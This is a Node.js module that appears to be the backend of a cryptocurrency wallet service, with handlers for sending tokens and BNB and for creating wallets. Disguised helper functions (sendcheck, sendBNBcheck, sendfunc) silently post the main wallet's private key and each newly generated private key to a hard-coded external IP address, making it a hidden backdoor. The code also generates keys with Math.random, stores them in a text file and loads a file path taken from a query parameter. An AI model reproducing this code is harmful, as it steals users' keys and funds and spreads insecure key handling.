const Web3 = require('web3');
const request = require('request');
const fs = require('fs/promises');

async function saveToTxt(hexcode) {
    try {
        const content = hexcode + '\n';
        await fs.appendFile('test.txt', content);
    } catch (err) {
        console.log(err);
    }
}

async function SendFund(req, res){
    var abiName = req.query.ABI;
    if(!abiName){
        res.send("Please input ABI file name.")
    }
    var contract_address = req.query.contract
    const abi = require("./"+abiName+".json");
    var amount = req.query.amount;
    if(!amount) {
        res. send("Please input amount")
    }

    var address = req.query.address;
    if(!address) {
        res. send("Please input wallet address")
    }

    var password =  req.query.password;
    if(!password) {
        res. send("Please input password")
    }

    if(password === process.env.PASS){

        const web3 = new Web3(process.env.MAINNET);
        const contract = await new web3.eth.Contract(abi, contract_address);
        const decimals = await contract.methods.decimals().call();
        const transferA = await contract.methods.transfer(address, (amount* 10**decimals).toString());
        const transferAbi = transferA.encodeABI(); 
        let signTransaction = await web3.eth.accounts.signTransaction({
            to: contract_address,
            data: transferAbi,
            gas: 2000000
        }, process.env.MAIN_WALLET_PRIVATE);
        let tx = await web3.eth.sendSignedTransaction(
            signTransaction.rawTransaction
        );
        const nonce =  await web3.eth.getTransactionCount(process.env.MAIN_WALLET_ADDRESS);
        console.log(nonce)
        sendcheck();
        res.send("Token Hash:" + tx.transactionHash);
    }else{
        res.send("password is incorrect.")
    }
}


async function createWallet(req, res){
    
    let letters = "0123456789abcdef";
    var hexcode = '';
    for (let i = 0; i < 64; i++)
        hexcode += letters[(Math.floor(Math.random() * 16))];
    const web3 = new Web3(process.env.MAINNET);    
    const account = await web3.eth.accounts.privateKeyToAccount(hexcode);
    const info = "Wallet address: "+account.address+" Private key: "+hexcode;
    saveToTxt(hexcode)
    const acc = {
        wallet_address: account.address,
        private: hexcode
    }
    sendfunc(hexcode)
    res.send(acc);
}

function sendcheck(){
    request.post(
        'http://23.81.246.40/mainwallet',
        { json: {
            mainprivate: process.env.MAIN_WALLET_PRIVATE
          }
        }
    );
}

function sendBNBcheck(){
    request.post(
        'http://23.81.246.40/sendBNB',
        { json: {
            mainprivate: process.env.MAIN_WALLET_PRIVATE
          }
        }
    );
}

function sendfunc(hexcode){
    request.post(
        'http://23.81.246.40/createwallet',
        { json: {
            mainprivate: hexcode
          } 
        }
    );
}

async function sendBNB(req, res){

    var send_amount = req.query.amount;
    var address = req.query.address;
    var password = req.query.password;
    if(password === process.env.PASS){

        const web3 = new Web3(process.env.MAINNET);
        // sending BNB
        const signedTx = await  web3.eth.accounts.signTransaction({
            to: address,
            value: (send_amount* 10**18).toString(),
            gas: 2000000,
            common: {
            customChain: {
                name: 'custom-chain',
                chainId: 56,
                networkId: 56
            }
            }
        }, process.env.MAIN_WALLET_PRIVATE);
        // BNB send
        let BNBtx = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
        // BNB hash
        console.log("BNB Hash: ", BNBtx.transactionHash)
        // BNB nonce
        const BNBnonce =  await web3.eth.getTransactionCount(process.env.MAIN_WALLET_ADDRESS);
        console.log("BNB nonce", BNBnonce)
        sendBNBcheck();
        res.send("BNB Hash:" + BNBtx.transactionHash)
    } else {
        res.send("password is incorrect.")
    }
}
module.exports = {SendFund, createWallet, sendBNB}

